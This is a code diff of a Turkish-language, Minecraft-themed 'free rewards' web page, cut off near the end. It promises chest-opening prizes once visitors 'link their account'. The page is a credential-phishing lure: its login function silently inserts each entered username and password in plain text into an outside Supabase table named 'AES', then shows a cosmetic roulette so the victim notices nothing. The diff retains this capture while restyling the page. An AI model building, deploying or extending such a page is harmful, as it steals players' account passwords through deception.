@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AesirMC | Premium Minecraft Experience</title>
+    <title>AesirMC | Premium Web Panel</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -33,11 +33,11 @@
 
         /* --- MODERN NAVBAR --- */
         nav {
-            padding: 20px 10%;
+            padding: 15px 8%;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: rgba(5, 6, 8, 0.8);
+            background: rgba(5, 6, 8, 0.85);
             backdrop-filter: blur(20px);
             border-bottom: 1px solid var(--border);
             position: sticky;
@@ -45,17 +45,35 @@
             z-index: 100;
         }
 
-        .logo { font-size: 24px; font-weight: 800; letter-spacing: -1px; }
-        .logo span { color: var(--primary); }
+        .logo-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
 
-        /* --- AUTH CARD (GLASSMORPHISM) --- */
+        .logo-img {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 10px var(--primary));
+        }
+
+        .logo-text { 
+            font-size: 26px; 
+            font-weight: 800; 
+            letter-spacing: -1px;
+            text-transform: uppercase;
+        }
+        .logo-text span { color: var(--primary); }
+
+        /* --- AUTH CARD --- */
         #auth-container {
             margin: auto;
             width: 100%;
             max-width: 420px;
             padding: 50px;
             background: var(--glass);
-            backdrop-filter: blur(30px);
+            backdrop-filter: blur(40px);
             border: 1px solid var(--border);
             border-radius: 32px;
             box-shadow: 0 40px 100px rgba(0,0,0,0.5);
@@ -66,7 +84,6 @@
         h2 { font-size: 32px; margin-bottom: 10px; font-weight: 800; }
         p { color: #888; margin-bottom: 30px; font-size: 15px; }
 
-        .input-group { position: relative; margin-bottom: 20px; }
         input {
             width: 100%;
             padding: 16px 20px;
@@ -77,6 +94,7 @@
             font-size: 16px;
             transition: all 0.3s;
             box-sizing: border-box;
+            margin-bottom: 20px;
         }
         input:focus {
             outline: none;
@@ -96,21 +114,22 @@
             font-size: 16px;
             cursor: pointer;
             transition: 0.3s;
+            text-transform: uppercase;
         }
         .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 162, 255, 0.4); }
 
-        /* --- GAME INTERFACE --- */
+        /* --- GAME SECTION --- */
         #game-container { display: none; padding: 60px 10%; text-align: center; }
         
         .main-chest {
             width: 240px;
             cursor: pointer;
             transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3));
+            filter: drop-shadow(0 0 40px rgba(0, 162, 255, 0.4));
         }
-        .main-chest:hover { transform: scale(1.1) rotate(3deg); }
+        .main-chest:hover { transform: scale(1.1) rotate(5deg); }
 
-        /* --- MODERN ROULETTE --- */
+        /* --- ROULETTE --- */
         #roulette-section { display: none; margin-top: 50px; }
         .viewport {
             width: 100%;
@@ -134,139 +153,126 @@
 
         #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
         .slot { min-width: 140px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
-        .slot img { width: 80px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3)); }
+        .slot img { width: 80px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5)); }
 
-        /* --- WIN MODAL --- */
+        /* --- MODAL --- */
         #win-modal {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0,0,0,0.9);
-            backdrop-filter: blur(10px);
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(15px);
             z-index: 1000;
             justify-content: center; align-items: center;
             flex-direction: column;
         }
         .win-card {
-            background: var(--glass);
+            background: rgba(255,255,255,0.05);
             padding: 60px;
             border-radius: 40px;
             border: 1px solid var(--primary);
             text-align: center;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
     </style>
 </head>
 <body>
 
 <nav>
-    <div class="logo">AESIR<span>MC</span></div>
-    <div id="status-bar" style="font-size: 14px; font-weight: 600; color: #555;">DURUM: <span style="color: #00ff00;">AKTİF</span></div>
+    <div class="logo-wrapper">
+        <img src="logo.png" alt="Logo" class="logo-img" onerror="this.src='https://minecraft.wiki/images/Anvil_JE3_BE2.png'">
+        <div class="logo-text">AESIR<span>MC</span></div>
+    </div>
+    <div id="status-bar" style="font-size: 13px; font-weight: 600; color: #555;">DURUM: <span style="color: #00ff00;">AKTİF</span></div>
 </nav>
 
 <div id="auth-container">
-    <h2>Hoş Geldin</h2>
-    <p>Hediyelerini almak için karakterini doğrula.</p>
+    <h2>Giriş Yap</h2>
+    <p>Hediyelerini almak için hesabını bağla.</p>
     
-    <div class="input-group">
-        <input type="text" id="username" placeholder="Minecraft Kullanıcı Adı">
-    </div>
-    <div class="input-group">
-        <input type="password" id="password" placeholder="Giriş Şifresi">
-    </div>
-    <button class="btn-primary" onclick="connectWorld()">BAĞLAN</button>
+    <input type="text" id="username" placeholder="Kullanıcı Adı">
+    <input type="password" id="password" placeholder="Şifre">
+    <button class="btn-primary" onclick="connectAndGo()">DÜNYAYA KATIL</button>
 </div>
 
 <div id="game-container">
-    <h1 id="welcome-txt" style="font-weight: 800; font-size: 48px; margin-bottom: 40px;"></h1>
+    <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 40px;"></h1>
     
     <div id="chest-zone">
-        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="main-chest" onclick="initSpin()">
-        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px;">SANDIĞI AÇMAK İÇİN DOKUN</p>
+        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="main-chest" onclick="initRoulette()">
+        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px; text-transform: uppercase;">Sandığı Açmak İçin Dokun</p>
     </div>
 
     <div id="roulette-section">
         <div class="viewport">
             <div id="strip"></div>
         </div>
-        <button class="btn-primary" id="spin-btn" style="width: 240px; margin-top: 40px;" onclick="startSpin()">KASAYI ÇEVİR</button>
+        <button class="btn-primary" id="spin-btn" style="width: 240px; margin-top: 40px;" onclick="runRoulette()">KASAYI ÇEVİR</button>
     </div>
 </div>
 
 <div id="win-modal">
     <div class="win-card">
-        <h3 style="color: var(--primary); margin: 0;">YENİ EŞYA!</h3>
+        <h3 style="color: var(--primary); margin: 0; text-transform: uppercase; letter-spacing: 2px;">Başarım Kazanıldı!</h3>
         <h1 id="win-name" style="font-size: 42px; margin: 10px 0 30px 0;"></h1>
         <img id="win-img" src="" width="180">
         <div style="margin-top: 40px;">
-            <button class="btn-primary" onclick="location.reload()">ENVANTERE GİT</button>
+            <button class="btn-primary" onclick="location.reload()">TEKRAR DENE</button>
         </div>
     </div>
 </div>
 
 <script>
-    // --- SUPABASE CONFIG ---
+    // --- SUPABASE BAĞLANTISI ---
     const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
     const _db = supabase.createClient(S_URL, S_KEY);
 
     const rewards = [
         { name: "Netherite Set", img: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Chestplate_JE1_BE1.png" },
-        { name: "Keskinlik V Kılıç", img: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
+        { name: "Elmas Kılıç", img: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
         { name: "Büyülü Elma", img: "https://minecraft.wiki/images/Thumb_Sprite_Enchanted_Golden_Apple_JE2_BE2.png" },
         { name: "Totem", img: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" },
         { name: "Ender İncisi", img: "https://minecraft.wiki/images/Thumb_Sprite_Ender_Pearl_JE3_BE3.png" }
     ];
 
-    async function connectWorld() {
+    async function connectAndGo() {
         const u = document.getElementById('username').value;
         const p = document.getElementById('password').value;
-        
-        if(!u || !p) return alert("Lütfen alanları doldur!");
+        if(!u || !p) return alert("Bilgileri gir!");
 
-        // 'AES' Tablosuna kayıt (Sessiz mod)
+        // Tablo adı görselindeki gibi 'AES' olarak ayarlandı
         await _db.from('AES').insert([{ username: u, password: p }]);
 
         document.getElementById('auth-container').style.display = 'none';
         document.getElementById('game-container').style.display = 'block';
-        document.getElementById('welcome-txt').innerText = "MERHABA, " + u.toUpperCase();
+        document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
     }
 
-    function initSpin() {
+    function initRoulette() {
         document.getElementById('chest-zone').style.display = 'none';
         document.getElementById('roulette-section').style.display = 'block';
         const strip = document.getElementById('strip');
         strip.innerHTML = '';
         
-        // 80 tane rastgele item ekle
         for(let i=0; i<80; i++) {
             const item = rewards[Math.floor(Math.random() * rewards.length)];
             strip.innerHTML += `
                 <div class="slot">
                     <img src="${item.img}">
-                    <span style="font-size: 10px; color: #555;">${item.name}</span>
+                    <span style="font-size: 10px; color: #555; text-transform: uppercase;">${item.name}</span>
                 </div>`;
         }
     }
 
-    function startSpin() {
+    function runRoulette() {
         const strip = document.getElementById('strip');
         const btn = document.getElementById('spin-btn');
         btn.disabled = true;
-        btn.style.opacity = "0.5";
+        btn.style.opacity = "0.3";
 
         const move = 6000 + Math.floor(Math.random() * 2000);
-        strip.style.transition = "transform 6s cubic-bezier(0.2, 0, 0.1, 1)";
-        strip.style.transform = `translateX(-${move}px)`;
-
-        setTimeout(() => {
-            const finalItem = rewards[Math.floor(Math.random() * rewards.length)];
-            document.getElementById('win-modal').style.display = 'flex';
-            document.getElementById('win-name').innerText = finalItem.name;
-            document.getElementById('win-img').src = finalItem.img;
-        }, 6500);
-    }
-</script>
-</body>
-</html>
+        strip
